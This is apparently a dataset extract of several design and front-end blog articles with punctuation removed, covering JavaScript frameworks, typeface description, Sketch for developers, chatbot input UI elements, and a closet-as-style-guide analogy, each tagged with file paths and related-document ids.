where changes to the DOM may directly update data  e g   as is the case with Angular 1 and Knockout   With 2 way binding  changes to the DOM during the DOM render process  called the digest cycle in Angular 1  can potentially retrigger the drawing phase before the drawing is finished  causing reflows and repaints   slowing performance   React does not prescribe a data management system  but a Flux based approach is recommended  React s 1 way data flow approach borrowing ideas from functional programming and immutable data structures transformed the way we think about front end framework architecture   For more on React   Flux architecture  read  The Best Way to Learn to Code is to Code  Learn App Architecture by Building Apps    create react app   The quickest way to get started with React   The quickest way to get started with React  react router   Dead simple routing for React   Dead simple routing for React  Next js   Dead simple Universal render   Routing for Node   React   Dead simple Universal render   Routing for Node   React  velocity react   Animations for React   allows you to use the VMD bookmarklet for interactive visual motion design on your pages   Redux  Redux provides transactional  deterministic state management for your apps  In Redux  we iterate over a stream of action objects to reduce to the current application state  To learn why that s important  read  10 Tips for Better Redux Architecture   To get started with Redux  check out the excellent courses by the creator of Redux  Dan Abramov   Redux is mandatory learning  even if you never use Redux for a production project   Why  Because it will give you lots of practice and teach you the value of using pure functions and teach you new ways to think about reducers  which are general purpose functions for iterating over collections of data and extracting some value from them  Reducers are so generally useful that Array prototype reduce was added to the JS specification   Reducers are important for more than just arrays  and learning new ways of working with Reducers is valuable all by itself   redux saga   A synchronous style side effect library for Redux  Use this to manage I O  such as handling network requests    Angular 2    Angular 2  is the successor to the wildly popular Angular framework from Google  Because of it s crazy popularity  it s going to look great on your resume   but I recommend learning React first   I have a preference for React over Angular 2  because   It s simpler  and It s extremely popular and used in lots of jobs  so is Angular 2    For this reason  I recommend learning React  but I consider Angular 2  strictly optional   If you have a strong preference for Angular 2   feel free to swap them  Learn Angular 2  first  and consider React optional  Either will benefit you and look great on your resume   Whichever you choose  try to focus on it for at least 6 months   1 year before running off to learn the other one  It takes time to really sink into strong proficiency   RxJS   RxJS is a collection of reactive programming utilities for JavaScript  Think of it as Lodash for streams  Reactive programming has officially arrived on the JavaScript scene  The ECMAScript Observables proposal is a stage 1 draft  and RxJS 5  is the canonical standard implementation   As much as I love RxJS  if you just import the whole thing all at once  it can really bloat your bundle sizes  there are lots of operators   To combat bundle bloat  don t import the whole thing  Use the patch imports  instead   Using patch imports can reduce the size of your rxjs dependencies in your bundle by  200k  That s a really big deal  It will make your app much faster   EDIT  Why Didn t You List  your favorite thing    Several people have asked why I didn t list their favorite framework  One of the important criteria I considered was  will this be useful on a real job     Yes  this is a popularity contest  but the opportunities that knowing a framework will open up is an important consideration when you re deciding where to focus your learning investment   To answer that question  I looked at some key indicators  First  Google Trends  If you want to reproduce this Google Trends graph  remember to select by topic  not keyword  since several of these words will deliver lots of false positives  In other words  these are topic focused trends  not keyword searches   JS Topics on Google Trends  What this tells us is relative interest in various projects  If people are searching for them  chances are they re exploring their options  or searching for help or documentation  This is a pretty decent indicator of relative usage levels   Another good source of data is Indeed com  which aggregates job listing data from a large variety of sources  Job posting popularity has declined sharply in recent years  but they still collect enough data to make good relative comparisons that tell you frameworks that people are actually using in production projects  on the job   To reproduce those findings  search for  framework name  javascript and leave the location blank  As you can clearly see   Angular and React dominate  Nothing else even comes close   Except jQuery  which is used on a huge share of all websites   non apps included   because it s used by almost all legacy systems  including popular CMS systems like WordPress    You might see that Angular has a significant advantage over React in these listings  Why do I recommend learning React first  Because   In other words  React is winning the mindshare and customer satisfaction battles  and if the trends over the past year and a half continue to unfold  React has a very real chance of unseating Angular as the dominant front end framework   Angular 2  has a chance to turn that around  so Angular could make a comeback  but so far  React is putting up a really good fight   Frameworks to Watch  Vue js   has a ton of GitHub stars and downloads  If things continue the way they are going  it will do very well in 2017  but I don t think it will unseat either React or Angular  both of which are also growing fast  in the next year or so  Learn this after you have learned React or Angular   has a ton of GitHub stars and downloads  If things continue the way they are going  it will do very well in 2017  but I don t think it will unseat either React or Angular  both of which are also growing fast  in the next year or so  Learn this you have learned React or Angular  MobX  is a great data management library which has become a popular alternative to Redux  It is also growing fast  and I expect it will also do well in 2017  I prefer Redux for most apps  but there are definitely cases where MobX is a better choice  For example  if you have hundreds of thousands of dynamic DOM objects on a page  it will probably perform better  Also  if your app workflows are all simple and you don t need transactional  deterministic state  you probably don t need Redux  MobX is definitely a simpler solution  Learn this after you have learned Redux   Next Steps  Now that you ve studied up on all this hot tech  read  How to Land Your First Development Job in 5 Simple Steps    Level up your JavaScript game  If you re not a member  you re missing out,"[1305 1144 820 444 200 454 329 1267 58 996 629]"
1334,training-dataset/product/1066.txt,product,How to describe typefacesThis is an excerpt from Designing with type  a 9 part InVision e course by Luke Jones   Selecting an appropriate font for a project lies in the ability to understand more than what a font looks like   An avant garde font from the early 20th century set alongside a serif humanist font from the 17th century will be a confusing contrast the fonts would contradict each other  In contrast  pairing 2 fonts from the same era of similar styles will harmonize on the page   An essential part of choosing  pairing  and formatting fonts lies in the ability to describe them  Plus  your ability to describe type will make your rationale for design rock solid and selling your designs is a fundamental part of being a successful designer   Check out designers  favorite typefaces here    Describing type will be broken down into   Font classifications  Anatomy of type  Display or text  Note  I ll be using  points  as a unit of measurement  Points translate across all typographic mediums  whereas units like  ems  or  pixels  focus on screen only   Additional words  such as ligature or glyph  will be described as and when they re used so they re shown in context with the definition   Font classifications  There are 7 primary classifications to help describe and choose type  They were devised in the 19th century and still stand today   Humanist  Transitional  Modern  Slab  Humanist sans  Transitional sans  Geometric  Humanist and humanist sans are inspired by the letterforms of calligraphy  the gentle curves and strokes emulating that of a human hand  Transitional typefaces are a step away from the emulated edges of a calligraphic pen  and they have sharper edges and a starker contrast  Modern  slab  and geometric are further away from the humanist letterforms  instead being created through heavy lines  stronger contrast  and geometric shapes   There are looser classifications of type  e g  grotesque or handwritten   but there isn t a standardized method of describing them  Many of these fonts have characteristics that can be described using the primary classifications   Anatomy of type  Every letter in every alphabet is unique and can be broken down into their core anatomies  Understanding the construction of each glyph will give you a greater appreciation of what makes each typeface different  and it ll make it easier to pick a font that s appropriate for what you need   To break down the segments of each glyph  these are   Descender  The part of a glyph that descends below the baseline in letters such as g  p  and y  Counter  The white space within a curved letter in letters such as a  c  and e  Serif  The  feet  of a letter  sans serif literally means  without serif   Spine  The center part of the stroke in the letter  s   Ascender  The part of a glyph that ascends above the x height in letters such as b  d  and h  Stem  The vertical stroke of a letterform in letters such as F and H  Bowl  The closed  rounded part of a letter in letters such as a  b  and p  Terminal  A type of curve that ends without a serif in letters such as a  c  and f  In addition to the anatomy of a letter is how lines of text are made up  These terms are particularly helpful when trying to pair fonts or adjust font sizing   Cap height  The distance from the baseline to the top of a flat letter such as E or F  Baseline  The line on which letters sit  ignoring the overhang of curved letters  x height  The height of a lowercase letter  x  or the main body of each letter  excluding any ascenders or descenders  This is a list of the most common words used when discussing the anatomy of type  To delve into the deep world of typography terminology  take a look at Typography Deconstructed   Display or text   Classifications and anatomy aside  every font is created with a different purpose in mind  One of these is whether the font is suitable for display  text  or both  Put simply  display fonts are used for large text or headings and text fonts are used for just that  body text   Pairing fonts is something we ll talk about later in this course  but here s a teaser  A font should be used for its intended purpose  A display font has been designed for use at large sizes  so it won t be optimized for smaller sizes  In the same way  text fonts weren t designed for use at large sizes  so they ll lack the punch or detail provided by display fonts  yet they remain legible at small sizes   Superfamilies  Some type designers just create a single typeface of one weight and style  but there are others who create vast families of fonts that include every variant the user of the font could hope for such as small caps  serif  sans serif  display  and text  all in one   Superfamilies like Freight by Darden Studio are vast  versatile  and will pair together by design even when contrasting serif and sans serif text  This is just a small selection of the fonts available in the family  and it s clear to see how the display font  text font  and text sans font harmonize with one another on the page   Read the next chapter of this e course  Get Luke Jones s 9 part InVision e course  Designing with type  delivered right to your inbox,"[1334 1275 311 218 564 1001 425 1420 1344 1077 444]"
1344,training-dataset/product/917.txt,product,Sketch for front end developers  part 1Editor s note  This is the first of 2 posts on Sketch for front end developers  Read part 2 here   As a front end developer  finally getting passed a design file is a big moment for me  There s lot to explore  busily digging into every little corner of what I ll be spending my next few weeks on   That Christmas morning excitement is easily dashed when someone sends me a file from a program I m not super familiar with  I mean  I ll build your website that s designed in Illustrator  but I m not gonna be stoked about it   It s in that spirit that I m here to attempt to explain some inner workings of the relatively new kid on the block  Sketch  As we see more adoption  I m noticing more and more developers diving in  ready to learn the new ropes   If you re looking to do that  you ve come to the right place   Sketch 101  To understand how to navigate your way around a file  let s start with some basics terms and skills you ll need every time you open a Sketch document   Most of these aren t explicitly new concepts  but Sketch has a way of doing things a bit differently  read  better  than you might be used to in other design apps  so this is definitely the place to start   Terms  Pages  A single Sketch document is capable of containing a bunch of different sections  Pages are the top level of organization inside your Sketch file  and designers use them in a number of different ways   They can be used as literal pages  like those in your website or app  And they can be used to split out and organize different views or breakpoints  If your designer uses Craft  you might find a page containing a living style guide   Point is  you might need to open the Sketch doc and poke around a bit to make sense of your designer s flow  No biggie just jump from page to page with the menu in the upper left corner of Sketch  located at the top of the layers palette   Artboards  Inside of a single page  your designer is probably using multiple artboards  An artboard is a space inside of a page that s used to contain a specific design   Just like pages  there are lots of ways to use artboards  Most often  artboards are used to contain a single screen or single view  Sometimes artboards contain isolated elements  like icons or modular blocks of design  I often use artboards for various device breakpoints so I can design for all devices inside a single space  I love seeing mobile right next to desktop   When I m working on a complex flow  I ll have artboards with step after step laid out in a big web   Take some time to poke around the file and see how the designer is using artboards  You ll find artboards listed in the layers palette  and you can jump from artboard to artboard by holding down the FN key and pressing the right left arrow key   Layers  You kinda get a break on this one  because layers in Sketch work like they do in most other modern graphics programs  Everything you see inside the document is listed in the layers palette  which you ll find running along the left side of Sketch   If your designer loves you  things will be helpfully named and grouped logically  If you find yourself a bit lost in the document  you can automatically scroll a layer into view by selecting it in the layers palette and pressing CMD   2  Remember that key combo we ll be talking about it again in just a moment   Symbols  Okay  developer prepare to get excited  Symbols are what initially pulled me into Sketch  because they make repetitive and complex design systems really easy to work with   Most simply  a symbol is a reusable bit of design  It s a group of elements packaged to be reused around the Sketch file  all in sync  Sound familiar  It s just like the code you re about to write  Using symbols keeps the design consistent from view to view  and it gives a developer huge hints about how to translate this design system into code   A symbol is denoted in the layers palette by a purple sync icon  2 arrows pointing in a circle   In a recent update  Sketch added the ability to catalog all symbols inside the document into a special page  called symbols  smart  right    As a developer  that s a great place to get quick overview of the modules that make up the build a great head start   Styles  Another one that translates well into code  styles are visual rules  color  border  shadow  etc   saved for repeated use around the file  A designer can use styles to make sure fonts and fills are consistent from view to view   Aside from offering consistency  styles also offer sweeping changes  like the ability to instantly change all title text to dark blue  across dozens of pages a huge timesaver   And just like symbols  they give you a darn good hint about how to structure the build   My favorite way to view all styles in a document is with Craft  which creates a living style guide that I can share with my team  Getting a clear view of the design system before you build saves lots of time   Basic skills  Now that we ve got some basic navigational terminology covered  let s talk about some actual functionality things you ll be doing with the mouse over and over as you build   Selecting  With a complex design  it s sometimes hard to select exactly the element you need from a crowded layers palette or a busy canvas  Fix that by holding the CMD key  and make a direction selection of any element on the canvas  even through groups and other layers  To keep it rolling  you can hold CMD   Shift and select multiple layers at a time   Measuring  A front end is only as good as its spacing  which means you ll be using the measuring tool a lot  With an element selected  hold the option key while hovering on other elements to bring up the measurement guides  You ll get exact pixel values  centering lines  smart snapping to other layers  and more   Exporting  There s a full section on it coming up in another post  but I wanted to mention it here  because you ll be doing a lotttt of exporting  The good news  Sketch has my favorite export system  ever  You can export layers and artboards and slices with ease  and the export settings travel with the file  saving on repeat work   Zooming  Sketch has something called the infinite canvas  which means designers are capable of putting lots of stuff inside a single page or document  As mentioned above  CMD   2 will automatically zoom to the selected layer  and it works just as good when selecting something on the canvas  You can also hold Z to zoom  or Z   OPT to zoom out  with the mouse  but I find myself using the auto zoom far more often   Whew  With those basics covered  we re ready take some deep dives into the finer points of Sketch  Stay tuned for the next post in this series we ll explore the robust export system  making and sharing style libraries  pulling CSS directly from the design file  and working with Sketch files without even having Sketch installed  spoiler alert  it s totally possible    On to part 2 of this article  Keep reading about Sketch for front end developers   More posts on Sketch,"[1344 564 887 69 1175 1077 1001 319 425 1420 444]"
1395,training-dataset/product/413.txt,product,Creating input UI elements for a chatbot platformChatbots  as they exist today  aren t great at understanding natural human language  And this is one of the main reasons why most of the messaging apps  Messenger  Kik  etc   are resorting to a mix of graphical and text UI in their bot platforms  Think of buttons  carousels  and image cards not just text responses   We at Tars are using the browser as a platform to build our own chat interface for bots to operate  And this gives us complete freedom on the components we include  If you ve tried any of our bots  if you haven t  first try one out here and here   you probably know that we strongly support the graphical UI   text based approach  As a part of this thought process  we ve created a number of custom keyboard inputs in our front end interface to facilitate different user interactions and situations   Messenger  Kik  and Telegram are huge platforms where developers deploy hundreds of bots every day  I still feel these messaging platforms haven t done enough with front end components to help a botmaker create enriching user interactions   Related  The ultimate guide to chatbots  That s why I want to talk more about how we went about creating each custom UI  why each one makes sense  and how the lack of them is screwing up user interactions right now   Date and time scroller  Think of a scenario where you need to ask a user when they d like to make an appointment  There can be multiple ways of giving the same information   25th Nov  25th November  Nov 25th  25 11  25 11 2016  11 25 16 all of them essentially mean the same  but it becomes difficult for a machine to make sense of this data   This is why we ve incorporated a date and time scroller where users can roll the dials and select the date time   I haven t seen any other messaging platform provide this UI until now  and I feel this is a must have if a bot asks for a date or time from the user   Vertical buttons  Think of these as multiple choice options in a form where you have a limited number of things to choose from  Tapping on buttons makes the interaction quicker and also keeps the scope of the conversation limited   A button based approach makes sense when you have to choose between a veg and non veg pizza  but it might not be the best UI to have if you have 100 insurance policies to choose from   What else can be done with vertical buttons   Add an image next to each option to make it more visually appealing  Let the user either respond in a single tap or make them click on  Send  after they tap on any of the options  The latter helps in reconfirming if the user didn t select the particular option by mistake  There s no way to go back in a chat flow and that s why this customization makes sense   Add a quick info menu to each option to provide detailed information and improve the decision making process  One more important thing to keep in mind when you use button UI  Frame your question the right way  As Leszek explains in his article here  it s better to have bots ask a question in a way that limits the range of options and sets the context instead of asking a very open ended question   Restricting user input  This is one of the best things we ve done to our chat interface  Whenever we provide a graphical input UI  buttons  carousels  etc    we don t allow the user to type in anything in text   Why do that  Because a user can type in anything out there  and your bot isn t ready for that  Until you re there  keep user input simple and restricted so you don t break the conversation   What we do   And here s what happens when you don t have something like this    Done  and  pass  buttons  These are 2 small nuances incorporated because we ve always thought of scripted chatbots as an evolution of forms   When you re sending across your address or giving a detailed feedback over a chat interface  the general behavior is to press the send button after writing a few words  and the whole response is eventually spread across 3 4 statements  With a  done  button  you can keep typing and press this once you ve given the complete response   If you don t have such an option  the machine s next message would come after the first instance itself  resulting in incomplete responses   There might also be cases where a user wants to skip the question  and for that we have a  pass  button in place of the  send  button  As soon as the user starts typing  the  pass  button turns into a  send  button   Autocomplete suggestions  This is like the autocomplete functionality in a Google search where you start typing and it suggests possible options  This becomes particularly useful when you have a long list of options and having vertical buttons isn t feasible  Think of a long list of localities  cities  car models  etc   Stars and likes  Especially useful when you re asking for user feedback or experience and the response is more qualitative in nature  And you can even customize the icons to be stars  likes  hearts  or emoticons   Image cards  This is useful when you need to showcase multiple pieces of information about each item at one go  Could be a burger in a food ordering process or a shirt in a shopping flow  All the cards are stacked against each other and you can scroll through to look at all the options   There are 4 parts of this UI element  image  title  description  and footer  You can utilize these differently depending on what you want to display in there   In case you want to test out all these input UI elements  here s a link to a chatbot that takes you through one element at a time   Chat  being a minimalist interface with just bubbles and a text box  doesn t give much scope  And I believe we ll have to rethink how we can facilitate a variety of interactions by using the existing elements and adding new ones to the chat interface   Read more posts on chatbots,"[1395 900 444 400 629 28 1132 248 996 849 1001]"
1420,training-dataset/product/456.txt,product,How I use my closet as my personal design style guideA design style guide determines how a product is going to look  It reflects and shapes the style of the product  It gives you a convenient place to go when you need to reference what the rest of the product looks like as you re designing   Ever noticed the relationship between a design style guide and your closet  Swap out  product  above for  wardrobe  or  outfit  above  and you get the analogy   Your closet organization and the things you keep in it help you stand out with a strong sense of personality and unique style the same way companies want their products to stand out with a strong design style guide   Closets store our everyday needs  clothes  shoes  hats  socks  accessories  and more  We go there to choose the stylish pieces we re going to use to express ourselves every day  A design style guide stores your user interface components  typography  buttons  forms  toggles  and more  We go there to help design beautiful and consistent products   Both need to be well organized  and easy to peruse for details but also arranged so we can see the big picture   Let s take our analogy further  Here s how thinking of your closet like your design style guide and vice versa can help you improve the way you organize both   1  Color swatches  Putting the right colors next to each other improves the aesthetics of your closet and your product  Consider   Primary colors  Accent colors  Grays  Whites  Related  Learn how to manage colors in Photoshop like a pro  2  Typography is your personal style  Typography defines product character and page hierarchy  Your closet defines your style and personality  Think about these elements   Font family  Your own choice  Header  H1  H2  H3  H4  H5  Content  Paragraph  Label  Link  Font weight  Light  Regular  Italic  Semi bold  Bold  Extra bold  3  Iconography   Accessories  Iconography is like accessories  Who doesn t like eye candy  They are optional  but they add a little extra to a product or an outfit   4  Buttons   Shoes  Shoes are like buttons they take you places and the different types serve different purposes   Primary button  Triggers primary action on a page  Secondary button  Triggers actions secondary to the primary action  Tertiary button  Optional actions that are not necessary for the user flow  but enhance the experience  Quaternary button  Used for exit  reset  cancel  etc  functions  5  Drop downs   Bags  Drop downs are used to contain a menu of options  hiding extra stuff when you can t display it all upfront just like a bag   6  Forms   Scarves  Forms are usually used when registering online or when filling out shipping and billing information  They often come in 3 states  default  focus  and error  Like scarves of different patterns and weights signal different moods and weather  different colors and types of forms can signal different intentions in the product   The aesthetic usability effect   Aesthetic things are perceived to be easier to use than ugly things  Aesthetic things are more likely to be tried  accepted  displayed  and repeatedly used than ugly things     Universal Principles of Design  An elegant  clean look makes a good first impression on people and provides a pleasant viewing experience whether you re talking about an organized closet or the sleek design aesthetic of Apple products   It s a competitive world  and the nicer your product looks  the more enjoyable it is to interact with and the more likely it is people will use it  The same goes for the way you organize your wardrobe and style guides  Both should evolve forward to stay modern and reflect the changes in your design sensibility   Establishing consistent patterns   Usability and learnability improve when similar things have similar meanings and functions  Make things functionally consistent to leverage existing knowledge about functionality and use     Universal Principles of Design  Consistency crops up often in design principles and UX guidelines  It takes time and effort to establish consistent patterns and functionality  but helping your users learn those patterns improves their experience across the board   Related  The value of consistent design  Consider your closet  If the location of everything changed every day  or left socks were in a different drawer from your right socks  your experience using your closet would be pretty subpar  Establishing consistent and practical patterns matters  Here s a well laid out closet  with everything in a logical  and aesthetically pleasing  place   Products should be similarly organized  Take the Dribbble website  for example  The user experience there is consistent across pages users don t need to relearn patterns and can find the basic functions at any time   The closet analogy in practice  The analogy works both ways you can use your sense of style and organized closet to inspire similar organization and cleanliness in your style guide  or you can apply the design principles from your organized and useful style guide to your closet disaster   In both cases  everything should have its proper place and work harmoniously together to achieve a specific design aesthetic   Read more from Jessie Chen  How Netflix does A B testing,"[1420 218 319 1275 425 564 1344 444 1001 887 1395]"
